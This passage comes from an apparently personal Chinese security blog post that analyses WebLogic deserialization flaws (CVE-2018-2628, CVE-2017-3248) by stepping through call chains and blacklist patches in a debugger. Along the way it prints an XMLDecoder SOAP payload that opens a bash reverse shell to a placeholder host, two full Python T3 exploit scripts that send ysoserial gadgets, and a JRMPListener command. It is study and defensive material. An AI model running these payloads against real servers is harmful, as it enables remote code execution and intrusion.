xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.8.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">bash -i &amp;gt;&amp;amp; /dev/tcp/[IP]/[PORT] 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></div></figure>


        <h3 id="漏洞修复"   >
          <a href="#漏洞修复" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3>
      <p>官方补丁，没看怎么进行修复，不过应该时添加黑名单</p>

        <h2 id="CVE-2018-2628"   >
          <a href="#CVE-2018-2628" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2>
      <p>详见上面的<code>T3</code>反序列化，是<code>T3</code>协议的漏洞</p>

        <h3 id="漏洞探测"   >
          <a href="#漏洞探测" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3>
      <p>首先需要看<code>Weblogic</code>是否启用<code>T3</code>协议，以及版本号的判断</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 7001,7002 -T4 -A -v --script weblogic-t3-info 192.168.120.161</span><br></pre></td></tr></table></div></figure>


        <h3 id="环境搭建-1"   >
          <a href="#环境搭建-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3>
      <p>也是类似的，用<code>vulhub</code>的，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10172#toc-1" >https://xz.aliyun.com/t/10172#toc-1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>记得最后把<code>docker</code>重启一下就行</p>

        <h3 id="漏洞分析-1"   >
          <a href="#漏洞分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>先从最开始的<code>CVE-2015-4852</code>进行分析，参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/aevpg0#CVE-2015-4852" >Weblogic学习（一）： 初识T3反序列化 (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>使用如下<code>exp</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment">#负责大小端的转换 </span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePayload</span>(<span class="params">gadget,cmd</span>):</span></span><br><span class="line">    YSO_PATH = <span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span></span><br><span class="line">    sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    <span class="comment">#payload的长度四字节无符号整数</span></span><br><span class="line">    payloadLen = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#头部某些地方改掉也没关系，估计是只检测了一部分</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#反序列化标志，这个不能改</span></span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    payload = payloadLen + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;touch /tmp/o_success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></div></figure>

<p>首先断点下在<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>。如下图所示，可以看到前面还有一堆的调用链条</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208153909798.png" alt="image-20230208153909798"></p>
<p>是相关的异步以及线程、复用器(<code>muxer</code>)的分发等知识，不是很懂这里，估计是一些监听检测之类的，可以看看如下的介绍</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8073#toc-2" >CVE-2018-2628 Weblogic反序列化漏洞分析 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>然后看看现在的<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208160844802.png" alt="image-20230208160844802"></p>
<p>这个<code>var1</code>就是接收到的数据，看里面的<code>head</code>的<code>buf</code>属性，将其复制出来，用<code>python</code>打印一下看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208160956140.png" alt="image-20230208160956140"></p>
<p>可以看到这一大串，其实就是我们的<code>exp</code>中的原数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208161130659.png" alt="image-20230208161130659"></p>
<p>前面的<code>000005f2</code>就是总的数据包的长度，这些数据都是可控的，但是这个长度只能比实际<code>payload</code>短，不能长。</p>
<p>那么之后就是相关解析，进行反序列化了。</p>

        <h4 id="resolveClass"   >
          <a href="#resolveClass" class="heading-link"><i class="fas fa-link"></i></a><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h4>
      <p>在上述的<code>readObject</code>之后还会进行一系列的函数调用，其中比较重要的点就是<code>weblogic.rjvm.InboundMsgAbbrev#resolveClass</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163342951.png" alt="image-20230208163342951"></p>
<p>传入的<code>stream</code>会调用父类<code>ObjectInputStream</code>的<code>resolveClass</code>来进行类名解析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163240081.png" alt="image-20230208163240081"></p>
<p>对于总的<code>readObject</code>流程中，<code>weblogic.rjvm.InboundMsgAbbrev#resolveClass</code>大致扮演的角色如下廖师傅的图片</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/t0158bffbfdfc75d52f.png" alt="t0158bffbfdfc75d52f"></p>
<p>那么就可以在这里添加一个过滤条件，设置黑名单了，比如如下对于<code>12.2.1.3</code>版本的<code>Weblogic</code>就会有如下过滤，存在一个检查</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208163826701.png" alt="image-20230208163826701"></p>
<p>而从最开始的该<code>CVE</code>相关的<code>T3</code>反序列化爆出来之后，后续修复方案大多都是在调用父类<code>resolveClass</code>之前进行黑名单过滤，写的代码也是逐次迭代</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng" >weblogic历史T3反序列化漏洞及补丁梳理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>最开始针对<code>CVE-2015-4852</code>的修复是在<code>resolveClass</code>中引入了<code>ClassFilter.isBlackListed</code>进行过滤，盗用一下<code>cL0und</code>师傅的图，23333</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/640.png" alt="640"></p>
<p>后面缝缝补补，黑名单位置也更改在<code>WebLogicFilterConfig.class</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230207203932893.png" alt="image-20230207203932893"></p>
<p>所以在后续的漏洞中，由于黑名单的使用这里其实需要对<code>resolveClass</code>进行一个分析</p>

        <h4 id="CVE-2017-3248"   >
          <a href="#CVE-2017-3248" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4>
      <p>对于该漏洞的相关的漏洞发展绕过，可以看<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ikRBb4e8gMP8DtlpQlpYng" >weblogic历史T3反序列化漏洞及补丁梳理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，比较和本次<code>CVE-2018-2628</code>漏洞相关的是<code>CVE-2017-3248</code>，首次出现使用<code>JRMPClient</code>进行外带<code>RCE</code></p>
<p>对应的<code>exp</code>如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct # 负责大小端的转换 </span><br><span class="line"><span class="function"><span class="keyword">import</span> subprocess</span></span><br><span class="line"><span class="function">from sys <span class="keyword">import</span> stdout</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> socket</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> re</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> binascii</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">generatePayload</span><span class="params">(gadget,cmd)</span>:</span></span><br><span class="line"><span class="function">    YSO_PATH </span>= <span class="string">&quot;/home/hacker/Desktop/WEB/JAVA/ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">T3Exploit</span><span class="params">(ip,port,payload)</span>:</span></span><br><span class="line"><span class="function">    sock </span>=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    compile = re.compile(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = compile.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        print(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>  </span><br><span class="line">    #payload的长度四字节无符号整数</span><br><span class="line">    payloadLen = binascii.a2b_hex(b<span class="string">&quot;00000000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    #头部某些地方改掉也没关系，估计是只检测了一部分</span><br><span class="line">    t3header = binascii.a2b_hex(b<span class="string">&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    #反序列化标志，这个不能改</span><br><span class="line">    desflag = binascii.a2b_hex(b<span class="string">&quot;fe010000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = payloadLen + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,len(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;JRMPClient&quot;</span></span><br><span class="line">    command = <span class="string">&quot;[JRMPListern_IP]:[JRMPListern_Port]&quot;</span></span><br><span class="line">    payload = generatePayload(gadget, command)</span><br><span class="line">    T3Exploit(host, port, payload)</span><br></pre></td></tr></table></div></figure>

<p>可以看到发送的序列化对象是通过<code>ysoserial</code>生成的，我们看看<code>ysoserial</code>里面具体生成了什么对象</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208200426758.png" alt="image-20230208200426758"></p>
<p>可以看到生成的是<code>Registry</code>对象，然后将之复制出来，放到<code>IDEA</code>里面自己测试一下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">myTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Registry <span class="title">getObject</span> <span class="params">()</span></span>&#123;</span><br><span class="line">        String host = <span class="string">&quot;JRMPLister_IP&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = JRMPLister_Port;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(</span><br><span class="line">            myTest.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class[] &#123;Registry.class&#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class="line">        myTest test = <span class="keyword">new</span> myTest();</span><br><span class="line">        Registry testObj = test.getObject();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>在开启了远程的<code>JRMPLister_IP</code>之后</p>
<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ./ysoserial-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections6 &#x27;touch /tmp/zzzz&#x27;</span><br></pre></td></tr></table></div></figure>

<p>执行上述<code>JAVA</code>代码，发现并没有命令执行，远程也没有发送数据的信息显示。那么就可能现在还没有和远程进行通信，那么加入如下可以远程通信的代码</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">myTest test = <span class="keyword">new</span> myTest();</span><br><span class="line">Registry testObj = test.getObject();</span><br><span class="line">testObj.list();  <span class="comment">//列出可以远程调用的相关对象</span></span><br><span class="line">System.out.println(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>发现成功命令执行。</p>
<p>但是这里有个疑问，在<code>Weblogic</code>中反序列化对象之后，我并没有找到有对对象调用了远程通信的方法，而在调试的时候发现，当从<code>resloveClass</code>中返回，即完成如下代码就会得到命令执行了，这里有点不太懂。为什么能够远程通信了，这些代码里面并没有找到和远程通信的方法调用呀。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208201323984.png" alt="image-20230208201323984"></p>

        <h5 id="实际调用链"   >
          <a href="#实际调用链" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际调用链" class="headerlink" title="实际调用链"></a>实际调用链</h5>
      <p>参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2650" >ysoserial JRMP相关模块分析（二）- payloads/JRMPClient &amp; exploit/JRMPListener - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1" >RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>实际调试一下，看看是怎么从<code>Registry</code>调用到和远程通信的函数，将<code>Weblogic</code>的<code>jdk</code>拿出来调试，上述的文章告诉我们最后是在<code>jdk1.6.0_45/jre/lib/rt.jar!/sun.rmi.transport.StreamRemoteCall#executeCall</code>中获取到远程对象进行反序列化的，如下图所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209153555302.png" alt="image-20230209153555302"></p>
<p>断点下在这里，看一看实际数据，这里的<code>in</code>就是连接的数据流</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155129824.png" alt="image-20230209155129824"></p>
<p>断点之后再运行一下就断在如图所示地方，<code>ysoserial</code>会自动生成<code>BadAttributeValueExpException</code>这个类对象，然后将恶意的数据封装进去，所以实际的数据中，已经可以看到相关的<code>CC</code>链其实已经传过来并且反序列化了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209154129644.png" alt="image-20230209154129644"></p>
<p>看看对应的调用栈</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155514492.png" alt="image-20230209155514492"></p>
<p>有点多，前面大部分都是<code>RMI</code>机制相关的调用，不用太管，主要看实际的反序列化的点，即<code>weblogic.rjvm.InboundMsgAbbrev#readObject</code>处，那么相关的调用栈就如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209155913075.png" alt="image-20230209155913075"></p>
<p>这里可以看到有一堆的<code>readObject</code>，这其实涉及到<code>ObjectInputStream</code>反序列化的几种方式，参考:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/249654" >Weblogic CVE-2021-2394 反序列化漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，引用一下上述的一张图，其中红色和蓝色路径是互斥的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/t010c1b879c4be0fecb.png" alt="img"></p>
<p>那么前面就是针对接口<code>Registry</code>的以及<code>RemoteObjectInvocationHandler</code>的反序列化，而<code>RemoteObjectInvocationHandler</code>是继承自<code>RemoteObject</code>，<code>RemoteObject</code>又实现了<code>Serializable</code>接口，所以走的是下面蓝色的那条路径。</p>
<p>之后在<code>RemoteObject.readObject</code>上看一下，对里面的<code>RemoteObjectInvocationHandler.ref</code>，即<code>RemoteRef</code>进行了反序列化，通过判断<code>refClassName</code>，进入的是<code>else</code>路径，调用的是其<code>readExternal</code>函数，走的是上面红色的那条路，可以看到注释也说明了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163242665.png" alt="image-20230209163242665"></p>
<p>这个<code>ref</code>在之前的<code>payload</code>中看到的是</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br></pre></td></tr></table></div></figure>

<p>所以反序列化的是<code>UnicastRef</code>，其实现了<code>RemoteRef</code>接口，<code>RemoteRef</code>接口又实现了<code>Externalizable</code>接口，所以这里也能知道走的应该是红色路径。然后看看其反序列化函数，即<code>readExternal</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163615120.png" alt="image-20230209163615120"></p>
<p>调用其<code>read</code>函数，进行相关<code>IP/Port</code>的获取，然后进入到<code>registerRefs</code>函数，就是相关的<code>DGC(Distributed Garbage Collection)</code>分布式垃圾收集机制，可以参考，可以参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/322910.html" >攻击JavaRMI概述 - FreeBuf网络安全行业门户</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209163831012.png" alt="image-20230209163831012"></p>
<p>不是很懂这个，就是进行一些相关注册之后，最后会在<code>jdk1.6.0_45/jre/lib/rt.jar!/sun.rmi.transport.DGCImpl_Stub#dirty</code>函数中调用到<code>RemoteRef.invoke</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209165245896.png" alt="image-20230209165245896"></p>
<p>这里的<code>ref</code>就是那个<code>UnicastRef</code>了，然后就是这里的<code>invoke</code>函数了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230209175828791.png" alt="image-20230209175828791"></p>
<p>进入<code>excuteCall</code>函数，就是之前提到的，那么完整的分析就完成了，在<code>excuteCall</code>函数中通过如下代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var14 = this.in.readObject();</span><br></pre></td></tr></table></div></figure>

<p>完成远程对象的反序列化。</p>

        <h4 id="绕过CVE-2017-3248"   >
          <a href="#绕过CVE-2017-3248" class="heading-link"><i class="fas fa-link"></i></a><a href="#绕过CVE-2017-3248" class="headerlink" title="绕过CVE-2017-3248"></a>绕过CVE-2017-3248</h4>
      <p>继<code>CVE-2017-3248</code>之后，<code>CVE-2018-2628</code>生成的原因，就在于绕过了黑名单中对于<code>java.rmi.registry.Registry</code>的过滤，该过滤是放在<code>weblogic.rjvm.InboundMsgAbbrev#resolveProxyClass</code>中的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230208164502309.png" alt="image-20230208164502309"></p>
<p>而这个<code>resolveProxyClass</code>在前面那张廖师傅的图片也提到了，也是可以用来过滤的。</p>
